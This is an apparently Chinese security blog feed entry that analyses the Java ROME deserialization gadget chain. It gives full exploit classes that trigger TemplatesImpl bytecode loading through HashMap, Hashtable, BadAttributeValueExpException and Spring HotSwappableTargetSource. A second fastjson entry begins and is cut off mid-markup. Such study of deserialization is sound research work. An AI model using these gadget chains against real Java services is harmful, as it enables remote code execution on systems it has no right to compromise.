    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>jdk8u181</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h1><p>ROME反序列链的本质，是组件里的ToStringBean#toString可以任意getter调用。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1700402532931-a26c4fe4-ba36-4c03-9ee7-7930802a5978.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1700402550874-22686ab7-c67e-4d9a-a9fd-4952f3ba3eab.png" alt="image.png"><br>例如调getOutputProperties就是代码执行，于是问题转换成如何调ClassName#toString。<br>由此，分出许多不同利用链，本质是不同调toString的链子。<br>下面给出核心调用链，不同的部分在Exp的函数调用栈写明。<br>ClassLoader#defineClass-&gt;<br>TemplatesImpl#defineClass-&gt;<br>TemplatesImpl#defineTransletClasses-&gt;<br>TemplatesImpl#getTransletInstance-&gt;<br>TemplatesImpl#newTransformer-&gt;<br><strong>TemplatesImpl#getOutputProperties-&gt;</strong><br><strong>ToStringBean#toString-&gt;</strong><br><strong>GadgetsChains#triggerToStringFunction…..</strong></p><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:507, TemplatesImpl</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl</span><br><span class="line">invoke:62, NativeMethodAccessorImpl</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl</span><br><span class="line">invoke:498, Method</span><br><span class="line">toString:137, ToStringBean</span><br><span class="line">toString:116, ToStringBean</span><br><span class="line">beanHashCode:193, EqualsBean</span><br><span class="line">hashCode:176, EqualsBean</span><br><span class="line">hash:339, HashMap</span><br><span class="line">put:612, HashMap</span><br><span class="line">main:26, ROMEHashMap</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Utils.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROMEHashMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        <span class="comment">//        ReflectUtils.setFieldValue(templatesimpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        SerialUtils.serialize(hashMap);</span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:507, TemplatesImpl</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl</span><br><span class="line">invoke:62, NativeMethodAccessorImpl</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl</span><br><span class="line">invoke:498, Method</span><br><span class="line">toString:137, ToStringBean</span><br><span class="line">toString:116, ToStringBean</span><br><span class="line">beanHashCode:193, EqualsBean</span><br><span class="line">hashCode:110, ObjectBean</span><br><span class="line">put:465, Hashtable</span><br><span class="line">main:28, ROMEHashTable</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Utils.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROMEHashTable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"><span class="comment">//        ReflectUtils.setFieldValue(templatesimpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(objectBean,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        SerialUtils.serialize(hashtable);</span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:507, TemplatesImpl</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl</span><br><span class="line">invoke:62, NativeMethodAccessorImpl</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl</span><br><span class="line">invoke:498, Method</span><br><span class="line">toString:137, ToStringBean</span><br><span class="line">toString:116, ToStringBean</span><br><span class="line">readObject:86, BadAttributeValueExpException</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl</span><br><span class="line">invoke:62, NativeMethodAccessorImpl</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl</span><br><span class="line">invoke:498, Method</span><br><span class="line">invokeReadObject:1170, ObjectStreamClass</span><br><span class="line">readSerialData:2178, ObjectInputStream</span><br><span class="line">readOrdinaryObject:2069, ObjectInputStream</span><br><span class="line">readObject0:1573, ObjectInputStream</span><br><span class="line">readObject:431, ObjectInputStream</span><br><span class="line">unserialize:31, SerialUtils</span><br><span class="line">main:27, ROMEBadAttributeValueExpException</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Utils.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROMEBadAttributeValueExpException</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"><span class="comment">//        ReflectUtils.setFieldValue(templatesimpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);</span><br><span class="line"></span><br><span class="line">        SerialUtils.serialize(badAttributeValueExpException);</span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HotSwappableTargetSource"><a href="#HotSwappableTargetSource" class="headerlink" title="HotSwappableTargetSource"></a>HotSwappableTargetSource</h2><p>SpringBoot原生toString链，需要加载SpringBoot依赖。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ROME<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:507, TemplatesImpl</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl</span><br><span class="line">invoke:62, NativeMethodAccessorImpl</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl</span><br><span class="line">invoke:498, Method</span><br><span class="line">toString:137, ToStringBean</span><br><span class="line">toString:116, ToStringBean</span><br><span class="line">equals:392, XString</span><br><span class="line">equals:103, HotSwappableTargetSource</span><br><span class="line">putVal:635, HashMap</span><br><span class="line">put:612, HashMap</span><br><span class="line">main:29, ROMEHotSwappableTargetSource</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Utils.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROMEHotSwappableTargetSource</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(TemplatesImpl.class,templatesimpl);</span><br><span class="line">        <span class="comment">//        toStringBean.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(toStringBean);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;xxx&quot;</span>));</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(h1,h1);</span><br><span class="line">        hashMap.put(h2,h2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//        SerialUtils.serialize(hashMap);</span></span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本质是，如果带了ROME这个组件，可以通过调toString，达到调任意getter的目的。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://goodapple.top/archives/1145">ROME反序列化@枫</a><br><a href="https://xz.aliyun.com/t/12768">ROME反序列化@Ic4_F1ame</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;jdk8u181&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td clas</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="反序列化" scheme="https://jaspersec.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="ROME" scheme="https://jaspersec.top/tags/ROME/"/>
    
  </entry>
  
  <entry>
    <title>fastjson反序列化 基础</title>
    <link href="https://jaspersec.top/posts/1322769944.html"/>
    <id>https://jaspersec.top/posts/1322769944.html</id>
    <published>2023-12-24T04:32:20.000Z</published>
    <updated>2025-03-31T22:09:47.231Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>fastjson是阿里巴巴旗下的一个Java库，用于Java对象和JSON字符串之间的转换。<br>这个库从2017-2022年，陆陆续续爆出了20多个反序列化RCE。<br>官方采用黑名单的方式修复漏洞，这导致出现一系列的bypass&#x3D; &#x3D;<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698293500707-b0e4f3dc-81e8-4de1-8ff1-e10572a1a178.png" alt="image.png"></p><h1 id="序列化分析"><a href="#序列化分析" class="headerlink" title="序列化分析"></a>序列化分析</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 